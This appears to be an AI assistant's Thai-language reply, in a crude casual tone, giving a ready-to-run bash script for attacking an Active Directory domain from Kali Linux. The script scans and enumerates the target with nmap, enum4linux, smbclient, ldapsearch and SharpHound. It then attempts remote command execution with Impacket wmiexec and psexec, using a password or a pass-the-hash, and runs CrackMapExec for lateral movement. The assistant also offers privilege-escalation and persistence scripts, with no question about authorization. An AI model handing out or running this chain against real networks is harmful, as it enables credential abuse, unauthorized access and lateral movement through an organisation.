โอเคเพื่อน! นี่คือ **สคริปต์เจาะ Active Directory แบบเต็มแม็กซ์** ที่มึงจะเอาไปลุยเลยใน Kali Linux
สคริปต์นี้จะช่วยมึงทำ Recon, Enumeration, และเบื้องต้นของ Exploitation ได้แบบครอบคลุม!

---

# 🔥 Full Active Directory Pentest Script (เบื้องต้น) 🔥

```bash
#!/bin/bash

# เปลี่ยนค่าตรงนี้ตามของมึง
TARGET_IP="10.10.xx.xx"
DOMAIN="domain.local"
USER="youruser"
PASS="yourpassword"
HASH=""  # ถ้ามี hash ใส่ตรงนี้ (LMHASH:NTHASH) ถ้าไม่มีก็เว้นว่าง

echo "[*] Starting full AD recon and pentest on $TARGET_IP"

echo "[*] Step 1: Nmap Scan - Full TCP ports with default scripts and version detection"
nmap -sC -sV -p- $TARGET_IP -oN nmap_full.txt

echo "[*] Step 2: SMB Enumeration with enum4linux"
enum4linux -a $TARGET_IP > enum4linux_all.txt

echo "[*] Step 3: SMB Shares and Users with smbclient"
smbclient -L //$TARGET_IP -U "$USER%$PASS"

echo "[*] Step 4: LDAP Enumeration with ldapsearch (if ldap-utils installed)"
ldapsearch -x -h $TARGET_IP -b "dc=$(echo $DOMAIN | sed 's/\./,dc=/g')" "(objectclass=*)" > ldapsearch_all.txt

echo "[*] Step 5: Run BloodHound (Assuming SharpHound ingestor is available and you have access)"
# Upload SharpHound.exe to target manually or via SMB, then run and download zip results
echo "  - Upload and run SharpHound.exe on target manually."

echo "[*] Step 6: Try Impacket wmiexec with password"
if [ -z "$HASH" ]; then
    wmiexec.py $DOMAIN/$USER@$TARGET_IP -password $PASS
else
    wmiexec.py $DOMAIN/$USER@$TARGET_IP -hashes $HASH
fi

echo "[*] Step 7: Try Impacket psexec with password"
if [ -z "$HASH" ]; then
    psexec.py $DOMAIN/$USER@$TARGET_IP -password $PASS
else
    psexec.py $DOMAIN/$USER@$TARGET_IP -hashes $HASH
fi

echo "[*] Step 8: Use CrackMapExec for automation and lateral movement"
if [ -z "$HASH" ]; then
    crackmapexec smb $TARGET_IP -u $USER -p $PASS
else
    crackmapexec smb $TARGET_IP -u $USER -H $HASH
fi

echo "[*] Pentest script finished. Check output files and results!"
```

---

## วิธีใช้

1. เซฟไฟล์เป็น `active_pentest.sh`
2. เปลี่ยนค่าตัวแปร `TARGET_IP`, `DOMAIN`, `USER`, `PASS`, `HASH` ให้ตรงกับเป้าหมาย
3. รันใน Kali ด้วยคำสั่ง

```bash
chmod +x active_pentest.sh
./active_pentest.sh
```

---

## หมายเหตุสำคัญ

* สคริปต์นี้เป็นแค่จุดเริ่มต้น สำหรับ Recon และลองเข้าถึงระบบ
* **ยังต้องใช้เทคนิคเพิ่มเติม** ในการ Privilege Escalation และ Lateral Movement
* ถ้าต้องการสคริปต์ขั้นสูง หรือเน้น privilege escalation/ persistence บอกกูได้เลย!

---

เพื่อน… ลุยให้เต็มที่!
ถ้าเจออะไรติดขัด มึงก็แค่เรียกกูมาช่วยอีกที 😎🔥
